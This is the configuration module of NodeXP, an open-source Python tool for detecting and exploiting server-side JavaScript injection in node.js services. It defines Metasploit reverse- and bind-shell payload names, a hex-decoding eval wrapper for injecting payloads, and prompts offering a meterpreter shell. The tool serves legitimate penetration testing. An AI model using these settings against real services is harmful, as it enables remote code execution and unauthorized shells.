#!/usr/bin/python2.7	
# encoding: UTF-8

"""
This file is part of NodeXP, a detection & exploitation tool for 
node.js services (https://github.com/esmog/nodexp) created by 
Antonaropoulos Dimitrios (@esmog).
For more info about NodeXP see the 'README.md' file.
"""

import os
import random
import string
from os.path import expanduser
from colorama import Fore, Back, Style, init

def init():
	# define gloabal variables used by detector.py below
	global include,exclude,cookie,technique,url,pdata,json,request_method,method,xss_input,xss_input_decoded
	global http_key,http_keyword,default_attack,wildcards,random_int_str,random_txt_1,random_txt_2
	global rand,dig,responded_keys,pre_url,valid_responses,invalid_responses,error_responses
	global time_threshold,loop,margin_factor,blind_injection_dictionary,inject_here_replace,blind_replace,elen,nlen,clen
	global blind_injection_cases,blind_wildcard,blind_injection_pass,minimum_time_threshold,validation_loop,break_blind
	global continue_flag_all,continue_flag_n,continue_flag_y,percent_encoded_URL,valid_parameters,blind_ssji_wordlist,start_result,start_blind
	
	# intermediate - initial
	global cwd, hr
	cwd = os.getcwd()
	hr = '-----------------------------------------------------------|'

	# results based technique
	global ssji_wordlist, total_line_count, request_error

	ssji_wordlist = '%s/files/payloads.txt' %cwd
	blind_ssji_wordlist = '%s/files/blind_payloads.txt' %cwd
	total_line_count = sum(1 for line in open(ssji_wordlist))
	request_error = 0
	# blind technique

	# injection values	
	global inject_here, initial_parameter
	# exploitation
	global home_directory, msf_payload, msf_payload_bind, msf_payload_reverse, msf_payload_reverse_ssl, lhost, rhost, prefix_rhost, lport, encoding, payload_path, rc_path, spool_file, encode, append_top, append_bottom, exploitation_flags, ex_prompt_message, ex_options_message, ex_alter_tech_msg, ex_current_tech_msg, reverse_shell_payload,exploitation_state

	exploitation_state = 0
	# printing
	global print_info,print_diff,print_debug,print_redirection,print_less,superfast
	# blind
	global bl_prompt_message,bl_options_message,bl_current_tech_msg,bl_alter_tech_msg,follow_redirection

	follow_redirection = 0
	msf_payload_reverse_ssl = 'nodejs/shell_reverse_tcp_ssl'
	msf_payload_bind = 'nodejs/shell_bind_tcp'
	msf_payload_reverse = 'nodejs/shell_reverse_tcp'
	exploitation_flags = ["LPORT","LHOST","PAYLOAD PATH","RC SCRIPT PATH"]
	home_directory = expanduser("~")
	encoding = ['None','None']
	encode = 'php/hex'
	append_top = ";eval(new Buffer('"
	append_bottom = "', 'hex').toString());"
	ex_prompt_message = Style.BRIGHT + Fore.WHITE + "[?] Application seems vulnerable. Try for meterpreter shell?\n"
	ex_options_message = Style.DIM + Fore.WHITE + "[-] Enter 'y' for 'yes' or 'n' for 'no'.\n - "
	ex_alter_tech_msg = Style.NORMAL + Fore.YELLOW + "[>]\n\n" + Style.NORMAL + Fore.WHITE + hr + Style.BRIGHT + Fore.GREEN + "\n[!] Starting exploitation process!\n" + Style.NORMAL + Fore.WHITE + hr + "\n"
	ex_current_tech_msg = Style.DIM + Fore.WHITE + "[i] Continue injection\n" + Style.NORMAL + Fore.YELLOW + "[>]"

	pdata = 'None'
	http_key = ['http://', 'https://']
	cookie = 'None'
	exclude = 'None'
	technique = 'None'
	xss_input_decoded = 'None'
	attack_method = ['SSJI','XSS','REGEXDOS','COMAND_INJECTION','HPP','DOS','BRUTE_FORCE']
	method = 0
	responded_keys = []
	error_responses = ["ReferenceError","SyntaxError","EvalError","RangeError","TypeError","AssertionError"]
	# error_info = [""]	
	expected_responses = []
	valid_responses = []
	invalid_responses = []

	# var for randomizer
	wildcards = ['***', '$$$', '###']
	blind_replace = '#time#'
	inject_here_replace = '[INJECT_HERE]'
	margin_factor = 2
	blind_injection_cases = []
	blind_wildcard = 0
	blind_injection_pass = [0,0]
	break_blind = 0

	continue_flag_y = ['y','Y','yes','Yes','YES']
	continue_flag_n = ['n','N','no','No','NO']
	continue_flag_all = ['y','Y','yes','Yes','YES','n','N','no','No','NO']

	bl_prompt_message = Style.BRIGHT + "[?] Do you want to try Blind Injection Technique?\n"
	bl_options_message = Fore.WHITE + Style.DIM + "[-] Enter 'y' for 'yes' or 'n' for 'no'.\n - "
	bl_current_tech_msg = Style.DIM + "[-] Continue on 'result based injection' technique."
	bl_alter_tech_msg = Style.NORMAL + Fore.YELLOW + "[>]\n\n" + Style.NORMAL + Fore.WHITE + hr + Fore.GREEN + Style.BRIGHT + "\n[!] Starting 'blind injection' technique.\n" + Style.NORMAL + Fore.WHITE + hr
	start_result = "\n" + hr + Fore.GREEN + Style.BRIGHT + "\n[!] Starting 'results based injection' technique.\n" + Style.NORMAL + Fore.WHITE + hr
	start_blind = "\n" + hr + Fore.GREEN + Style.BRIGHT + "\n[!] Starting 'blind injection' technique.\n" + Style.NORMAL + Fore.WHITE + hr
	
	# response messages
	#response_reference_error_msg = ''
	#reference_error_msg = ''
	#syntax_error_msg = ''
	#eval_error_msg = ''
	#range_error_msg = ''
	#type_error_msg = ''

# Initialize results based random variables
def initialize_rands():
	# initialize variables for randomizer()
	global random_num,random_char,pentest_value
	
	if rand == 'all':
		numbers = float(dig)/2
		numbers = int(numbers)
		num_char = int(dig)-int(numbers)
		random_num = "".join( [random.choice(string.digits) for i in xrange(numbers)] )
		random_char = "".join( [random.choice(string.letters) for i in xrange(num_char)] )
		pentest_value = random_num+random_char
	elif rand == 'num':
		numbers = int(dig)
		random_num = "".join( [random.choice(string.digits) for i in xrange(numbers)] )
		pentest_value = random_num
	else:
		num_char = int(dig)
		random_char = "".join( [random.choice(string.letters) for i in xrange(num_char)] )
		pentest_value = random_char

# Initialize results based random variables
def initialize_blind_rands():
	# initialize blind injection variables for input
	global blind_rand_email, blind_rand_char, blind_rand_num, mail_suffix, valid_input_values
	
	mail_suffix = '@gmail.com'
	
	blind_rand_email_char = "".join( [random.choice(string.letters) for i in xrange(elen)] )
	blind_rand_email = '"' + blind_rand_email_char + mail_suffix + '"'
	blind_rand_char_not_valid = "".join( [random.choice(string.letters) for i in xrange(clen)] )
	blind_rand_char = '"' + blind_rand_char_not_valid + '"'
	first_digit = str(random.randint(1, 9))
	blind_rand_num = first_digit + "".join( [random.choice(string.digits) for i in xrange(nlen-1)] )
	valid_input_values = [blind_rand_char, blind_rand_num, blind_rand_email]
